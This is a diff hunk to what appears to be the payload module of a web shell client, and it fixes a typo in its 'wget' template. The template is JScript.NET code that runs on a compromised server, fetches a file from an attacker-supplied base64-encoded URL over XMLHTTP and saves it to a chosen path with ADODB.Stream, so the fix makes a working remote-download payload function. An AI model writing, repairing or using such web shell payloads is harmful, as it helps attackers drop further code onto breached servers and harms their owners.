@@ -72,7 +72,7 @@ module.exports = (arg1, arg2, arg3) => ({
 
   wget: {
     _:
-      `var X=new ActiveXObject("Microsoft.XMLHTTP");var S=new ActiveXObject("Adodb.Stream");S.Type=1;S.Mode=3;S.Open();X.Open("GET",System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])),false);X.Send();SWrite.(X.ResponseBody);S.Position=0;S.SaveToFile(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["${arg2}"])),2);S.close;S=null;X=null;Response.Write("1");`,
+      `var X=new ActiveXObject("Microsoft.XMLHTTP");var S=new ActiveXObject("Adodb.Stream");S.Type=1;S.Mode=3;S.Open();X.Open("GET",System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])),false);X.Send();S.Write(X.ResponseBody);S.Position=0;S.SaveToFile(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["${arg2}"])),2);S.close;S=null;X=null;Response.Write("1");`,
     [arg1]: "#{base64::url}",
     [arg2]: "#{base64::path}"
   }
